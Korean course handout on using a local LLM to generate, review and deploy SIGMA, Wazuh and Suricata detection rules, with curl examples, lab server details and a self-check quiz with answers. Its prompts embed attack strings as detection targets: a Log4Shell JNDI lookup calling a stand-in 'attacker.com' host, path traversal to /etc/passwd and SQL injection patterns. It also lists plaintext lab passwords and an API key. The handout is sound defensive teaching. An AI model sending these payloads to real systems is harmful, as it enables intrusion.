# Week 05: 탐지 룰 자동 생성

## 학습 목표
- SIGMA 룰과 Wazuh 룰의 구조를 이해한다
- LLM을 활용하여 공격 패턴에서 탐지 룰을 자동 생성할 수 있다
- 생성된 룰의 품질을 검증하는 방법을 익힌다
- 룰 생성 파이프라인을 구축할 수 있다

## 실습 환경 (공통)

| 서버 | IP | 역할 | 접속 |
|------|-----|------|------|
| opsclaw | 10.20.30.201 | Control Plane (OpsClaw) | `ssh opsclaw@10.20.30.201` (pw: 1) |
| secu | 10.20.30.1 | 방화벽/IPS (nftables, Suricata) | `sshpass -p1 ssh secu@10.20.30.1` |
| web | 10.20.30.80 | 웹서버 (JuiceShop:3000, Apache:80) | `sshpass -p1 ssh web@10.20.30.80` |
| siem | 10.20.30.100 | SIEM (Wazuh:443, OpenCTI:9400) | `sshpass -p1 ssh siem@10.20.30.100` |
| dgx-spark | 192.168.0.105 | AI/GPU (Ollama:11434) | 원격 API만 |

**OpsClaw API:** `http://localhost:8000` / Key: `opsclaw-api-key-2026`

## 강의 시간 배분 (3시간)

| 시간 | 내용 | 유형 |
|------|------|------|
| 0:00-0:40 | 이론 강의 (Part 1) | 강의 |
| 0:40-1:10 | 이론 심화 + 사례 분석 (Part 2) | 강의/토론 |
| 1:10-1:20 | 휴식 | - |
| 1:20-2:00 | 실습 (Part 3) | 실습 |
| 2:00-2:40 | 심화 실습 + 도구 활용 (Part 4) | 실습 |
| 2:40-2:50 | 휴식 | - |
| 2:50-3:20 | 응용 실습 + OpsClaw 연동 (Part 5) | 실습 |
| 3:20-3:40 | 복습 퀴즈 + 과제 안내 (Part 6) | 퀴즈 |

---

---

## 용어 해설 (AI/LLM 보안 활용 과목)

| 용어 | 영문 | 설명 | 비유 |
|------|------|------|------|
| **LLM** | Large Language Model | 대규모 언어 모델 (GPT, Claude, Llama 등) | 방대한 텍스트로 훈련된 AI 두뇌 |
| **Ollama** | Ollama | 로컬에서 LLM을 실행하는 도구 | 내 PC에서 돌리는 AI |
| **프롬프트** | Prompt | LLM에게 보내는 입력 텍스트 | AI에게 하는 질문/지시 |
| **토큰** | Token (LLM) | LLM이 처리하는 텍스트의 최소 단위 (~4글자) | 단어의 조각 |
| **컨텍스트 윈도우** | Context Window | LLM이 한 번에 처리할 수 있는 최대 토큰 수 | AI의 단기 기억 용량 |
| **파인튜닝** | Fine-tuning | 사전 학습된 모델을 특정 목적에 맞게 추가 학습 | 일반의가 전공 수련 |
| **RAG** | Retrieval-Augmented Generation | 외부 데이터를 검색하여 LLM 응답에 반영 | AI가 자료를 찾아보고 답변 |
| **에이전트** | Agent (AI) | 도구를 사용하여 자율적으로 작업하는 AI 시스템 | AI 비서 (스스로 판단하고 실행) |
| **도구 호출** | Tool Calling | LLM이 외부 도구/API를 호출하는 기능 | AI가 계산기를 꺼내서 계산 |
| **하네스** | Harness | 에이전트를 관리·제어하는 프레임워크 | AI 비서의 업무 규칙·관리 시스템 |
| **Playbook** | Playbook | 자동화된 작업 절차 (도구/스킬의 순서화된 묶음) | 표준 작업 지침서 (SOP) |
| **PoW** | Proof of Work | 작업 증명 (해시 체인 기반 실행 기록) | 작업 일지 + 영수증 |
| **보상** | Reward (RL) | 태스크 실행 결과에 따른 점수 (+성공, -실패) | 성과급 |
| **Q-learning** | Q-learning | 보상을 기반으로 최적 행동을 학습하는 RL 알고리즘 | 시행착오로 최적 경로를 찾는 학습 |
| **UCB1** | Upper Confidence Bound | 탐험(exploration)과 활용(exploitation)을 균형 잡는 전략 | "가본 길 vs 안 가본 길" 선택 전략 |
| **SubAgent** | SubAgent | 대상 서버에서 명령을 실행하는 경량 런타임 | 현장 파견 직원 |

---

# Week 05: 탐지 룰 자동 생성

## 학습 목표
- SIGMA 룰과 Wazuh 룰의 구조를 이해한다
- LLM을 활용하여 공격 패턴에서 탐지 룰을 자동 생성할 수 있다
- 생성된 룰의 품질을 검증하는 방법을 익힌다
- 룰 생성 파이프라인을 구축할 수 있다

---

## 1. 탐지 룰이란?

보안 이벤트에서 위협을 식별하기 위한 조건 집합이다.
"이러한 패턴이 발견되면 알림을 발생시켜라"는 규칙이다.

### 룰 포맷 비교

| 포맷 | 특징 | 대상 |
|------|------|------|
| **SIGMA** | 범용, SIEM 독립적 | 다양한 SIEM으로 변환 가능 |
| **Wazuh** | Wazuh 전용 XML | Wazuh SIEM |
| **Suricata** | 네트워크 IPS | 네트워크 트래픽 |
| **YARA** | 파일/메모리 패턴 | 악성코드 탐지 |

---

## 2. SIGMA 룰 구조

> **이 실습을 왜 하는가?**
> "탐지 룰 자동 생성" — 이 주차의 핵심 기술을 실제 서버 환경에서 직접 실행하여 체험한다.
> AI/LLM 보안 활용 분야에서 이 기술은 실무의 핵심이며, 실습을 통해
> 명령어의 의미, 결과 해석 방법, 보안 관점에서의 판단 기준을 익힌다.
>
> **이걸 하면 무엇을 알 수 있는가?**
> - 이 기술이 실제 시스템에서 어떻게 동작하는지 직접 확인
> - 정상과 비정상 결과를 구분하는 눈을 기름
> - 실무에서 바로 활용할 수 있는 명령어와 절차를 체득
>
> **주의:** 모든 실습은 허가된 실습 환경(10.20.30.0/24)에서만 수행한다.

```yaml
title: SSH Brute Force Detection
id: a1234567-b890-cdef-0123-456789abcdef
status: experimental
description: Detects SSH brute force attempts
author: Security Team
date: 2026/03/27
logsource:
  product: linux
  service: sshd
detection:
  selection:
    EventType: "authentication_failure"
    TargetUserName: "root"
  condition: selection | count() > 5
  timeframe: 5m
level: high
tags:
  - attack.credential_access
  - attack.t1110.001
falsepositives:
  - Users who forgot their password
```

### SIGMA 핵심 필드

| 필드 | 설명 |
|------|------|
| logsource | 로그 출처 (OS, 서비스) |
| detection | 탐지 조건 (selection + condition) |
| level | 심각도 (informational/low/medium/high/critical) |
| tags | MITRE ATT&CK 매핑 |

---

## 3. Wazuh 룰 구조

```xml
<group name="sshd,authentication_failed">
  <rule id="100001" level="10">
    <if_sid>5710</if_sid>
    <match>Failed password for root</match>
    <frequency>5</frequency>
    <timeframe>300</timeframe>
    <description>SSH brute force against root detected</description>
    <mitre>
      <id>T1110.001</id>
    </mitre>
    <group>authentication_failures,</group>
  </rule>
</group>
```

### Wazuh 룰 핵심 요소

| 요소 | 설명 |
|------|------|
| `<if_sid>` | 부모 룰 ID (이 룰이 먼저 발동해야 함) |
| `<match>` | 로그에서 찾을 문자열 |
| `<regex>` | 정규식 매칭 |
| `<frequency>` | 발생 횟수 조건 |
| `<timeframe>` | 시간 범위 (초) |
| `<description>` | 알림 설명 |

---

## 4. LLM으로 탐지 룰 생성

### 4.1 공격 설명에서 SIGMA 룰 생성

> **실습 목적**: Wazuh 알림을 LLM으로 자동 분석하여 위협 인텔리전스 보고서를 생성하는 파이프라인을 구축하기 위해 수행한다
>
> **배우는 것**: SIEM 알림 JSON을 LLM에 전달하는 데이터 파이프라인 구조와, 분석 결과를 구조화된 보고서로 변환하는 프롬프트 설계를 이해한다
>
> **결과 해석**: LLM 보고서의 위협 분류, 영향 범위, 대응 권고를 Wazuh 원본 알림과 대조하여 정확성을 검증한다
>
> **실전 활용**: SOC 야간 근무 시 자동 알림 분석, 일일 보안 브리핑 자동 생성, 경영진 보고서 초안 작성에 활용한다

공격 시나리오를 자연어로 설명하면 LLM이 유효한 SIGMA YAML 룰을 자동 생성한다.

```bash
# 공격 설명 → SIGMA 룰 YAML 자동 생성
# MITRE ATT&CK ID와 로그 소스를 포함하여 정확한 매핑 요청
curl -s http://192.168.0.105:11434/v1/chat/completions \
  -H "Content-Type: application/json" \
  -d '{
    "model": "gemma3:12b",
    "messages": [
      {"role": "system", "content": "SIGMA 룰 전문가입니다. 공격 설명을 받아 SIGMA 룰을 YAML 형식으로 생성합니다. 반드시 유효한 SIGMA 포맷을 따르세요."},
      {"role": "user", "content": "다음 공격에 대한 SIGMA 탐지 룰을 생성해주세요:\n\n공격: 리눅스 서버에서 권한 상승 시도\n패턴: 일반 사용자가 /etc/shadow 파일을 읽으려는 시도\n로그 소스: Linux auditd\nMITRE: T1003.008 (Credentials from Password Store)"}
    ],
    "temperature": 0.2
  }' | python3 -c "import json,sys; print(json.load(sys.stdin)['choices'][0]['message']['content'])"
```

### 4.2 로그 샘플에서 Wazuh 룰 생성

실제 로그 샘플을 LLM에게 전달하면 패턴을 분석하여 Wazuh XML 룰을 자동 생성한다. CMS 스캐닝처럼 빈도 기반 탐지가 필요한 경우 frequency/timeframe도 자동 설정된다.

```bash
# 로그 샘플 → Wazuh XML 룰 자동 생성
# rule id 100000-109999: 사용자 정의 룰 범위
curl -s http://192.168.0.105:11434/v1/chat/completions \
  -H "Content-Type: application/json" \
  -d '{
    "model": "gemma3:12b",
    "messages": [
      {"role": "system", "content": "Wazuh 룰 전문가입니다. 로그 샘플을 분석하여 Wazuh XML 룰을 생성합니다. rule id는 100000-109999 범위를 사용하세요."},
      {"role": "user", "content": "다음 로그 패턴을 탐지하는 Wazuh 룰을 만들어주세요:\n\n로그 샘플:\nMar 27 10:15:00 web apache2[5678]: [error] [client 203.0.113.50] File does not exist: /var/www/html/wp-login.php\nMar 27 10:15:01 web apache2[5678]: [error] [client 203.0.113.50] File does not exist: /var/www/html/wp-admin\nMar 27 10:15:02 web apache2[5678]: [error] [client 203.0.113.50] File does not exist: /var/www/html/administrator\n\n탐지 목적: WordPress/CMS 디렉토리 스캔 탐지\n조건: 같은 IP에서 5분 내 10회 이상 존재하지 않는 CMS 경로 접근"}
    ],
    "temperature": 0.2
  }' | python3 -c "import json,sys; print(json.load(sys.stdin)['choices'][0]['message']['content'])"
```

### 4.3 CVE에서 탐지 룰 생성

CVE 정보에서 공격 패턴을 추출하여 SIGMA 룰과 Suricata 룰을 동시에 생성한다. 네트워크 계층과 호스트 계층 양쪽에서 탐지할 수 있다.

```bash
# CVE-2021-44228(Log4Shell) → SIGMA + Suricata 룰 동시 생성
curl -s http://192.168.0.105:11434/v1/chat/completions \
  -H "Content-Type: application/json" \
  -d '{
    "model": "gemma3:12b",
    "messages": [
      {"role": "system", "content": "보안 탐지 엔지니어입니다. CVE 정보를 기반으로 SIGMA 룰과 Suricata 룰을 모두 생성합니다."},
      {"role": "user", "content": "CVE-2021-44228 (Log4Shell)에 대한 탐지 룰을 생성하세요.\n\n공격 패턴: HTTP 요청에 ${jndi:ldap://attacker.com/exploit} 문자열 포함\n로그 소스: 웹 서버 접근 로그, 네트워크 트래픽\n\nSIGMA 룰과 Suricata 룰을 각각 생성하세요."}
    ],
    "temperature": 0.2
  }' | python3 -c "import json,sys; print(json.load(sys.stdin)['choices'][0]['message']['content'])"
```

---

## 5. 룰 품질 검증

### 5.1 LLM으로 룰 리뷰

작성된 탐지 룰을 LLM에게 리뷰시켜 정확성, 오탐률, 우회 가능성, 성능 영향을 평가한다.

```bash
# 리뷰 대상 룰을 변수에 저장
RULE='<rule id="100010" level="12">
  <match>select.*from.*information_schema</match>
  <description>SQL Injection attempt detected</description>
</rule>'

# LLM에 룰 리뷰 요청: 5가지 평가 항목으로 분석
curl -s http://192.168.0.105:11434/v1/chat/completions \
  -H "Content-Type: application/json" \
  -d "{
    \"model\": \"gemma3:12b\",
    \"messages\": [
      {\"role\": \"system\", \"content\": \"Wazuh 룰 리뷰어입니다. 룰의 품질을 평가하고 개선 사항을 제시하세요.\\n평가 항목: 1.정확성 2.오탐률 3.우회 가능성 4.성능 영향 5.개선 제안\"},
      {\"role\": \"user\", \"content\": \"다음 Wazuh 룰을 리뷰해주세요:\\n$RULE\"}
    ],
    \"temperature\": 0.3
  }" | python3 -c "import json,sys; print(json.load(sys.stdin)['choices'][0]['message']['content'])"
```

### 5.2 검증 체크리스트

| 항목 | 확인 내용 |
|------|----------|
| 정확성 | 의도한 공격을 탐지하는가? |
| 오탐률 | 정상 활동에 알림이 발생하지 않는가? |
| 우회 | 인코딩, 대소문자 변환으로 우회 가능한가? |
| 성능 | 정규식이 과도하게 복잡하지 않은가? |
| MITRE | ATT&CK 기법이 올바르게 매핑되었는가? |

---

## 6. 실습

### 실습 1: SSH 공격 탐지 룰 생성 및 검증

```bash
# Step 1: 공격 설명으로 룰 생성
curl -s http://192.168.0.105:11434/v1/chat/completions \
  -H "Content-Type: application/json" \
  -d '{
    "model": "gemma3:12b",
    "messages": [
      {"role": "system", "content": "Wazuh 룰 전문가입니다."},
      {"role": "user", "content": "SSH에서 존재하지 않는 사용자로 로그인 시도를 탐지하는 Wazuh 룰을 생성하세요. 5분 내 3회 이상이면 알림."}
    ],
    "temperature": 0.2
  }' | python3 -c "import json,sys; print(json.load(sys.stdin)['choices'][0]['message']['content'])"
```

```bash
# Step 2: 생성된 룰 리뷰 요청
# (위에서 생성된 룰을 복사하여 리뷰 프롬프트에 입력)
```

### 실습 2: 웹 공격 SIGMA 룰 생성

3가지 웹 공격 패턴(SQLi, XSS, Path Traversal)에 대한 SIGMA 룰을 한 번에 생성시킨다.

```bash
# 3가지 웹 공격 패턴 → SIGMA 룰 일괄 생성 (MITRE 태그 포함)
curl -s http://192.168.0.105:11434/v1/chat/completions \
  -H "Content-Type: application/json" \
  -d '{
    "model": "gemma3:12b",
    "messages": [
      {"role": "system", "content": "SIGMA 룰 전문가입니다."},
      {"role": "user", "content": "다음 웹 공격 패턴들을 탐지하는 SIGMA 룰 3개를 생성하세요:\n1. SQL Injection (union select 패턴)\n2. XSS (script 태그 삽입)\n3. Path Traversal (../../etc/passwd)\n\n각 룰에 MITRE ATT&CK 태그를 포함하세요."}
    ],
    "temperature": 0.3
  }' | python3 -c "import json,sys; print(json.load(sys.stdin)['choices'][0]['message']['content'])"
```

### 실습 3: OpsClaw로 룰 배포 자동화

```bash
# 생성된 룰을 siem 서버에 배포하는 워크플로
curl -s -X POST http://localhost:8000/projects \
  -H "Content-Type: application/json" \
  -H "X-API-Key: opsclaw-api-key-2026" \
  -d '{
    "name": "deploy-detection-rule",
    "request_text": "LLM 생성 탐지 룰을 Wazuh에 배포",
    "master_mode": "external"
  }'
```

---

## 7. 룰 생성 파이프라인

```
위협 인텔리전스 (CTI)
  ↓
공격 패턴 추출
  ↓
LLM 룰 생성 (SIGMA/Wazuh)
  ↓
LLM 룰 리뷰 (품질 검증)
  ↓
테스트 환경 검증
  ↓
프로덕션 배포
  ↓
오탐/미탐 피드백 → LLM 재학습
```

---

## 핵심 정리

1. SIGMA는 범용 탐지 룰 포맷으로 다양한 SIEM에서 사용 가능하다
2. LLM은 공격 설명, 로그 샘플, CVE 정보에서 탐지 룰을 자동 생성한다
3. 생성된 룰은 반드시 정확성, 오탐률, 우회 가능성을 검증해야 한다
4. 룰 생성 → 리뷰 → 테스트 → 배포 → 피드백의 파이프라인을 구축한다
5. LLM이 생성한 룰은 출발점이며, 전문가 검증이 필수이다

---

## 다음 주 예고
- Week 06: 취약점 분석 - LLM을 활용한 코드 리뷰와 CVE 분석

---

---

## 심화: AI/LLM 보안 활용 보충

### Ollama API 상세 가이드

#### 기본 호출 구조

```bash
# Ollama는 OpenAI 호환 API를 제공한다
# URL: http://192.168.0.105:11434/v1/chat/completions

curl -s http://192.168.0.105:11434/v1/chat/completions \
  -H "Content-Type: application/json" \
  -d '{
    "model": "gemma3:12b",        ← 사용할 모델
    "messages": [
      {"role": "system", "content": "역할 부여"},  ← 시스템 프롬프트
      {"role": "user", "content": "실제 질문"}      ← 사용자 입력
    ],
    "temperature": 0.1,            ← 출력 다양성 (0=결정론, 1=창의적)
    "max_tokens": 1000             ← 최대 출력 길이
  }'
```

> **각 파라미터의 의미:**
> - `model`: 어떤 AI 모델을 사용할지. 큰 모델일수록 정확하지만 느림
> - `messages`: 대화 내역. system(역할)→user(질문)→assistant(답변) 순서
> - `temperature`: 0에 가까우면 같은 질문에 항상 같은 답. 1에 가까우면 매번 다른 답
> - `max_tokens`: 출력 길이 제한. 토큰 ≈ 글자 수 × 0.5 (한국어)

#### 모델별 특성

| 모델 | 크기 | 응답 시간 | 정확도 | 권장 용도 |
|------|------|---------|--------|---------|
| gemma3:12b | 12B | ~5초 | 양호 | 분석, 룰 생성, 보고서 |
| llama3.1:8b | 8B | ~3초 | 보통 | 빠른 분류, 검증 |
| qwen3:8b | 8B | ~5초 | 보통 | 교차 검증 (다른 벤더) |
| gpt-oss:120b | 120B | ~25초 | 높음 | 복잡한 분석 (시간 여유 시) |

#### 프롬프트 엔지니어링 패턴

**패턴 1: 역할 부여 (Role Assignment)**
```json
{"role":"system","content":"당신은 10년 경력의 SOC 분석가입니다. MITRE ATT&CK에 정통합니다."}
```

**패턴 2: 출력 형식 강제 (Format Control)**
```json
{"role":"system","content":"반드시 JSON으로만 응답하세요. 마크다운, 설명, 주석을 포함하지 마세요."}
```

**패턴 3: Few-shot (예시 제공)**
```json
{"role":"user","content":"예시:\n입력: SSH 실패 5회\n출력: {\"severity\":\"HIGH\",\"attack\":\"brute_force\"}\n\n이제 분석하세요: SSH 실패 20회 후 성공"}
```

**패턴 4: Chain of Thought (단계별 사고)**
```json
{"role":"system","content":"단계별로 분석하세요: 1)현상 파악 2)원인 추론 3)ATT&CK 매핑 4)대응 방안"}
```

### OpsClaw API 핵심 흐름 요약

```
[1] POST /projects                     → 프로젝트 생성
    Body: {"name":"...", "master_mode":"external"}
    Response: {"project":{"id":"prj_xxx"}}

[2] POST /projects/{id}/plan           → plan 단계로 전환
[3] POST /projects/{id}/execute        → execute 단계로 전환

[4] POST /projects/{id}/execute-plan   → 태스크 실행
    Body: {"tasks":[...], "parallel":true, "subagent_url":"..."}
    Response: {"overall":"success", "tasks_ok":N}

[5] GET /projects/{id}/evidence/summary → 증적 확인
[6] GET /projects/{id}/replay           → 타임라인 재구성
[7] POST /projects/{id}/completion-report → 완료 보고

모든 API에 필수: -H "X-API-Key: opsclaw-api-key-2026"
```

---

## 자가 점검 퀴즈 (5문항)

이번 주차의 핵심 기술 내용을 점검한다.

**Q1.** Ollama API에서 temperature=0의 효과는?
- (a) 최대 창의성  (b) **매번 동일한 출력 (결정론적)**  (c) 에러 발생  (d) 속도 향상

**Q2.** OpsClaw execute-plan 실행 전 반드시 거쳐야 하는 단계는?
- (a) 서버 재시작  (b) **plan → execute stage 전환**  (c) DB 백업  (d) 코드 컴파일

**Q3.** RL에서 UCB1 탐색 전략의 핵심은?
- (a) 항상 최고 보상 행동 선택  (b) **방문 횟수가 적은 행동을 우선 탐색**  (c) 무작위 선택  (d) 모든 행동 균등 선택

**Q4.** Playbook이 LLM adhoc보다 재현성이 높은 이유는?
- (a) LLM이 더 똑똑해서  (b) **파라미터가 결정론적으로 바인딩되어 동일 명령 생성**  (c) 네트워크가 빨라서  (d) DB가 달라서

**Q5.** OpsClaw evidence가 제공하는 핵심 가치는?
- (a) 실행 속도 향상  (b) **모든 실행의 자동 기록으로 감사 추적 가능**  (c) 메모리 절약  (d) 코드 자동 생성

**정답:** Q1:b, Q2:b, Q3:b, Q4:b, Q5:b

---
---

> **실습 환경 검증 완료** (2026-03-28): Ollama 22모델(gemma3:12b ~5s), OpsClaw 50프로젝트, execute-plan 병렬, RL train/recommend
